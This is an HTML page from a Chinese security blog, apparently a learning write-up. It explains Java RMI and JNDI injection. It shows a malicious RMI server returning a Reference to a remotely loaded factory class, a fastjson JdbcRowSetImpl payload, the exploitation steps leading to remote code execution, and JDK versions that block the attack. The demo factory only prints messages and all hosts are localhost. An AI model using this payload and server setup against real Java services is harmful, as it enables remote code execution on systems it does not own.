@@ -1,0 +1,453 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>了解JNDI注入 | 1jzz</title>
+<link rel="shortcut icon" href="https://1jzz.github.io/favicon.ico?v=1659229140591">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://1jzz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="了解JNDI注入 | 1jzz - Atom Feed" href="https://1jzz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="RMI
+介绍
+RMI全称是Remote Method Invocation，远程方法调用。它的作用是让某个java虚拟机上的对象调用另一个java虚拟机中对象上的方法，只不过RMI是java独有的一种机制。接下来我们就介绍一下RMI是怎么使..." />
+    <meta name="keywords" content="java" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://1jzz.github.io">
+  <img class="avatar" src="https://1jzz.github.io/images/avatar.png?v=1659229140591" alt="">
+  </a>
+  <h1 class="site-title">
+    1jzz
+  </h1>
+  <p class="site-description">
+    当人生跌入谷底，剩下的每一步都是向上。
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              了解JNDI注入
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-04-18
+              </span>
+              <span>
+                11 min read
+              </span>
+              
+                <a href="https://1jzz.github.io/tag/gqY7ztfMX/" class="post-tag">
+                  # java
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="rmi">RMI</h1>
+<h2 id="介绍">介绍</h2>
+<p>RMI全称是Remote Method Invocation，远程方法调用。它的作用是让某个java虚拟机上的对象调用另一个java虚拟机中对象上的方法，只不过RMI是java独有的一种机制。接下来我们就介绍一下RMI是怎么使用的。</p>
+<blockquote>
+<p>远程方法调用是分布式编程中的一个基本思想。实现远程方法调用的技术有很多，比如：CORBA、WebService，这两种都是独立于编程语言的。而RMI（Remote Method Invocation）是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过序列化方式进行编码传输的。</p>
+</blockquote>
+<h2 id="rmi的使用">RMI的使用</h2>
+<h3 id="rmi的组成">RMI的组成</h3>
+<ul>
+<li>RMI Registry</li>
+<li>RMI Server
+<ul>
+<li>一个继承了<code>java.rmi.Remote</code>的接口，其中定义我们要远程调用的方法，例如test()</li>
+<li>一个实现这个接口的类</li>
+<li>一个主类(RMI Server)，用来创建Registry，并将上面的类实例绑定到一个地址</li>
+</ul>
+</li>
+<li>RMI Client</li>
+</ul>
+<h3 id="rmi的通信过程">RMI的通信过程</h3>
+<ol>
+<li>RMI Server将需要远程访问的对象(Remote Object)绑定到RMI Registry中(指定一个Name)</li>
+<li>客户端首先连接RMI Registry，并在Registry中查找指定Name的对象(JRMI中的Call)。</li>
+<li>RMI Registry将Name绑定的Remote Object(序列化该对象)返回给RMI Client</li>
+</ol>
+<p>这样，一个远程对象/方法就被调用了。<br>
+<img src="https://1jzz.github.io/post-images/1650288265120.png" alt="" loading="lazy"></p>
+<h3 id="远程对象调用">远程对象调用</h3>
+<p>RMIServer：</p>
+<pre><code class="language-java">public class RMIServerTest {
+    public interface ITest extends Remote {
+        public String helloTest() throws RemoteException;
+    }
+
+    public class Test implements ITest {
+
+        protected Test() throws RemoteException {
+            UnicastRemoteObject.exportObject(this, 0);
+            System.out.println(&quot;init......&quot;);
+        }
+
+        @Override
+        public String helloTest() throws RemoteException{
+            System.out.println(&quot;hello&quot;);
+            return &quot;Test&quot;;
+        }
+    }
+
+    public void start() throws RemoteException, MalformedURLException {
+        Test test = new Test();
+        LocateRegistry.createRegistry(1099);
+        Registry registry = LocateRegistry.getRegistry();
+        registry.rebind(&quot;Test&quot;, test);
+    }
+
+    public static void main(String[] args) throws Exception {
+        new RMIServerTest().start();
+    }
+}
+</code></pre>
+<p>RMI Client：</p>
+<pre><code class="language-java">public class RMIClient implements Serializable {
+    public class Payload extends ArrayList&lt;Integer&gt; {}
+
+    public void lookup() throws Exception {
+        RMIServerTest.ITest r = (RMIServerTest.ITest) Naming.lookup(&quot;rmi://127.0.0.1:1099/Test&quot;);
+        String test = r.helloTest();
+        System.out.println(test);
+    }
+
+    public static void main(String[] args) throws Exception {
+        new RMIClient().lookup();
+    }
+}
+</code></pre>
+<p>注意：</p>
+<ul>
+<li>远程对象的实现类必须继承UnicastRemoteObject类。如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法</li>
+<li>使用远程方法调用，必然会涉及参数的传递和执行结果的返回。参数或者返回值可以是基本数据类型，当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现 java.io.Serializable 接口，并且客户端的serialVersionUID字段要与服务器端保持一致</li>
+<li>ITest是客户端和服务端共用的接口(客户端必须有远程对象的接口，不然无法指定要调用的方法，而且全限定名必须与服务器上的对象完全相同)</li>
+<li>所有方法必须抛出RemoteException</li>
+</ul>
+<h3 id="rmi远程调用步骤">RMI远程调用步骤</h3>
+<p><img src="https://1jzz.github.io/post-images/1650288284047.png" alt="" loading="lazy"><br>
+<img src="https://1jzz.github.io/post-images/1650288289664.png" alt="" loading="lazy"></p>
+<ol>
+<li>生成一个远程接口</li>
+<li>实现远程对象(服务器端程序)</li>
+<li>生成占位程序和骨干网(服务器端程序)</li>
+</ol>
+<p>stub和skeleton代理都是在服务端程序中由RMI系统动态生成，服务端程序只需要继承java.rmi.server.UnicastRemoteObject类</p>
+<ol start="4">
+<li>编写服务器程序</li>
+<li>编写客户程序</li>
+<li>注册远程对象</li>
+<li>启动远程对象</li>
+</ol>
+<blockquote>
+<p>值得注意的是理论上讲RMIService，RMIServer，RMIClient可以部署到3个不同的JVM中，这个时候的执行的顺序是RMIService---RMIServer—RMIClient。另外也可以由RMIServer来启动RMIService这时候执行的顺序是RMIServer—RMIService—RMIClient。<br>
+实际应用中很少有单独提供一个RMIService服务器，开发的时候可以使用Registry类在RMIServer中启动RMIService。</p>
+</blockquote>
+<h1 id="jndi">JNDI</h1>
+<h2 id="介绍-2">介绍</h2>
+<p>JNDI（The Java Naming and Directory Interface，Java命名和目录接口）是一组在Java应用中访问命名和目录服务的API,命名服务将名称和对象联系起来,使得我们可以用名称访问对象。<br>
+这些命名/目录服务提供者:</p>
+<ul>
+<li>RMI (JAVA远程方法调用)</li>
+<li>LDAP (轻量级目录访问协议)</li>
+<li>CORBA (公共对象请求代理体系结构)</li>
+<li>DNS (域名服务)</li>
+</ul>
+<p>其实JNDI是资源的统一管理，其底层还是使用RMI进行JAVA远程方法调用。<br>
+<img src="https://1jzz.github.io/post-images/1650288295977.png" alt="" loading="lazy"><br>
+这里的jndiName变量的值可以上面的命名/目录服务列表中有效的参数，如果JDNI名称可控的话可能会被攻击。<br>
+JDNI Client调用方式：</p>
+<pre><code class="language-java">String jndiName = &quot;rmi://127.0.0.1:1099/Test&quot;;
+Context context = new InitialContext();
+context.lookup(jndiName);
+</code></pre>
+<h2 id="jndi-reference注入">JNDI Reference注入</h2>
+<p>既然JDNI是使用RMI进行远程方法调用的，那么方法的执行不应该在RMI Server上吗(也就是我们搭建的恶意RMI服务)？为什么会在RMI Client上执行呢？<br>
+RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，RMI Server会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当RMI Client在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</p>
+<h3 id="jndi注入之rmi">JNDI注入之RMI</h3>
+<p>RMI Server代码：</p>
+<pre><code class="language-java">public class RMIServer {
+    public static void main(String[] args) throws Exception{
+        Registry registry = LocateRegistry.createRegistry(1099);
+        Reference test = new Reference(&quot;Calc&quot;, &quot;Calc&quot;, &quot;http://127.0.0.1:8080/&quot;);
+        ReferenceWrapper refObjWrapper = new ReferenceWrapper(test);
+        registry.rebind(&quot;Test&quot;, refObjWrapper);
+    }
+}
+
+</code></pre>
+<p>Calc类(不能添加包名，因为该类为一个Factory类所以需要实现ObjectFactory接口，且需要编译成字节码文件，然后放在web上)：</p>
+<pre><code class="language-java">import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
+import java.util.Hashtable;
+
+public class Calc implements ObjectFactory {
+    {
+        System.out.println(&quot;code call&quot;);
+    }
+
+    static {
+        System.out.println(&quot;static code call&quot;);
+    }
+
+    public Calc() {
+        System.out.println(&quot;Constructor call&quot;);
+    }
+
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception {
+        System.out.println(&quot;getObjectInstance call&quot;);
+        return null;
+    }
+}
+</code></pre>
+<p>RMI Client：</p>
+<pre><code class="language-java">public class RMIClient {
+    public static void main(String[] args) throws Exception {
+        Context context = new InitialContext();
+        context.lookup(&quot;rmi://127.0.0.1/Test&quot;);
+    }
+}
+
+</code></pre>
+<p>执行结果：<br>
+可以看到构造函数、静态代码块、代码块、getObjectInstance方法中的代码都被执行了。<br>
+<img src="https://1jzz.github.io/post-images/1650288303420.png" alt="" loading="lazy"><br>
+执行流程：</p>
+<ol>
+<li><code>InitialContext.getURLOrDefaultInitCtx()</code>：获取对应协议的URLContext对象，例如我这里传入的为rmi则是rmiURLContext</li>
+<li><code>GenericURLContext.lookup()</code>接着调用返回的Context对象的lookup方法，因为rmiURLContext类没有lookup方法，所以此时来到了其父类GenericURLContext的lookup方法</li>
+<li><code>GenericURLContext.getRootURLContext()</code>：对传入的地址进行解析，拿到了目标RMI Registry的ip地址以及其绑定的Name</li>
+<li><code>RegistryContext.lookup()</code>：使用stub建立连接，去RMI Registry中寻找Name为Test的对象</li>
+<li><code>RegistryContext.decodeObject()</code>：因为ReferenceWrapper对象实现了RemoteReference接口,所以会调用getReference方法会获取Reference对象<br>
+此时就获取到了RMI Registry中Reference对象的信息：<br>
+<img src="https://1jzz.github.io/post-images/1650288310207.png" alt="" loading="lazy"></li>
+<li><code>NamingManager.getObjectInstance()</code>：加载并实例化Factory类(Calc)，实例化成功之后调用其getObjectInstance方法</li>
+<li><code>NamingManager.getObjectFactoryFromReference()</code>：从本地的CLASSPATH下loadClass其factoryName(也就是Calc)，如果找不着则根据factoryName以及codebase加载远程class。加载factory类之后将其实例化</li>
+</ol>
+<p><img src="https://1jzz.github.io/post-images/1650288315902.png" alt="" loading="lazy"><br>
+如果通过URLClassLoader去加载远程类，可以看到访问日志新增了一条记录：<br>
+<img src="https://1jzz.github.io/post-images/1650288321832.png" alt="" loading="lazy"></p>
+<blockquote>
+<p>整个利用流程如下：</p>
+<ol>
+<li>目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；</li>
+<li>攻击者控制URI参数为恶意的RMI服务地址，如：<code>rmi://ip/Name</code>；</li>
+<li>攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；</li>
+<li>目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例；</li>
+<li>攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；</li>
+</ol>
+</blockquote>
+<h3 id="jndi注入之jdbcrowsetimpl利用链">JNDI注入之JdbcRowSetImpl利用链</h3>
+<p>使用fastjson进行演示JdbcRowSetImpl利用链。<br>
+JdbcRowSetImpl类位于com.sun.rowset.JdbcRowSetImpl，是jdk中自带的类。</p>
+<blockquote>
+<p>Matthias Kaiser(@matthias_kaiser)发现com.sun.rowset.JdbcRowSetImpl类的execute()也可以触发JNDI注入利用，调用过程如下：</p>
+<ul>
+<li>-&gt; JdbcRowSetImpl.execute()</li>
+<li>-&gt; JdbcRowSetImpl.prepare()</li>
+<li>-&gt; JdbcRowSetImpl.connect()</li>
+<li>-&gt; InitialContext.lookup(dataSource)</li>
+</ul>
+</blockquote>
+<p>可以在IDEA中使用Find Usage看看是否有setter/getter调用了其中execute、prepare、connect的一个方法，最终可以发现connect方法可以发现分别在getDatabaseMetaData方法和setAutoCommit方法中调用，setAutoCommit方法在反序列化过程中会自动调用，所以我们的入口方法就是它。<br>
+<img src="https://1jzz.github.io/post-images/1650288327476.png" alt="" loading="lazy"><br>
+payload：<br>
+通过setDataSourceName给dataSourceName赋值，传入autoCommit调用setAutoCommit方法进入入口方法connect。这里autoCommit的值不会影响。</p>
+<pre><code class="language-json">{
+  &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+  &quot;dataSourceName&quot;:&quot;rmi://127.0.0.1/Test&quot;,
+  &quot;autoCommit&quot;:&quot;false&quot;
+}
+</code></pre>
+<p>最终因为返回了一个空的var2(null)对象，然后调用了其getConnect方法，会抛出<code>java.lang.NullPointerException</code>空指针异常。<br>
+<img src="https://1jzz.github.io/post-images/1650288332994.png" alt="" loading="lazy"><br>
+执行结果：<br>
+<img src="https://1jzz.github.io/post-images/1650288336329.png" alt="" loading="lazy"></p>
+<h2 id="超时问题">超时问题</h2>
+<p>我在调试的过程中发现RMI Registry虽然绑定到1099端口，但是JNDI Client或者RMI Client不一定会解析到127.0.0.1，而是有可能解析到电脑中的其他网卡中(默认是主机名对应的ip地址)，远程利用时自然无法建立通信。</p>
+<blockquote>
+<p>启动了RMI Registry的服务端有两个端口，一个是RMI Registry监听端口，另一个是远程对象的通信端口。而远程对象通信端口是系统随机分配的，远程对象的通信Host、Port等信息由RMI Registry传递给客户端，通信Host的默认值是服务端本地主机名对应的IP地址。</p>
+</blockquote>
+<p>问题解决：<br>
+可以把/etc/hosts中指向内网IP的记录删除或者指向外网IP，也可以在攻击者的RMI服务端通过代码明确指定远程对象通信Host IP：<br>
+<code>System.setProperty(&quot;java.rmi.server.hostname&quot;,&quot;外网IP&quot;);</code><br>
+或者在启动RMI服务时，通过启动参数指定 java.rmi.server.hostname 属性：<br>
+<code>-Djava.rmi.server.hostname=服务器真实外网IP</code></p>
+<h1 id="总结">总结</h1>
+<ul>
+<li>RMI：在<code>jdk8u121</code>、<code>7u131</code>、<code>6u141</code>版本开始默认<code>com.sun.jndi.rmi.object.trustURLCodebase</code>设置为false,rmi加载远程的字节码不会执行成功。</li>
+<li>LDAP：在<code>jdk11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code>版本开始默认com.sun.jndi.ldap.object.trustURLCodebase设置为false,ldap加载远程的字节码不会执行成功。</li>
+</ul>
+<p>还缺少LDAP的利用，还有jdk高版本绕过，学完之后再写一个工具进行巩固。</p>
+<h1 id="参考">参考</h1>
+<p><a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html">https://kingx.me/Exploit-Java-Deserialization-with-RMI.html</a><br>
+<a href="https://blog.csdn.net/qq_28081453/article/details/83279066">https://blog.csdn.net/qq_28081453/article/details/83279066</a><br>
+<a href="https://blog.csdn.net/xinghun_4/article/details/45787549">https://blog.csdn.net/xinghun_4/article/details/45787549</a><br>
+<a href="http://blog.topsec.com.cn/java-jndi%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3/">http://blog.topsec.com.cn/java-jndi%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3/</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#rmi">RMI</a>
+<ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D">介绍</a></li>
+<li><a href="#rmi%E7%9A%84%E4%BD%BF%E7%94%A8">RMI的使用</a>
+<ul>
+<li><a href="#rmi%E7%9A%84%E7%BB%84%E6%88%90">RMI的组成</a></li>
+<li><a href="#rmi%E7%9A%84%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B">RMI的通信过程</a></li>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E8%B0%83%E7%94%A8">远程对象调用</a></li>
+<li><a href="#rmi%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8%E6%AD%A5%E9%AA%A4">RMI远程调用步骤</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#jndi">JNDI</a>
+<ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-2">介绍</a></li>
+<li><a href="#jndi-reference%E6%B3%A8%E5%85%A5">JNDI Reference注入</a>
+<ul>
+<li><a href="#jndi%E6%B3%A8%E5%85%A5%E4%B9%8Brmi">JNDI注入之RMI</a></li>
+<li><a href="#jndi%E6%B3%A8%E5%85%A5%E4%B9%8Bjdbcrowsetimpl%E5%88%A9%E7%94%A8%E9%93%BE">JNDI注入之JdbcRowSetImpl利用链</a></li>
+</ul>
+</li>
+<li><a href="#%E8%B6%85%E6%97%B6%E9%97%AE%E9%A2%98">超时问题</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://1jzz.github.io/post/4P2cUi2vD/">
+              <h3 class="post-title">
+                fastjson之BasicDataSource利用链
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  友链： <a href="https://www.cnblogs.com/sherlson/" target="_blank">sherlson</a>、<a href="https://cyberczy.github.io/" target="_blank">cyberczy</a>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d4b50d1451bf48cde435f45724be67b3";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+  <a class="rss" href="https://1jzz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
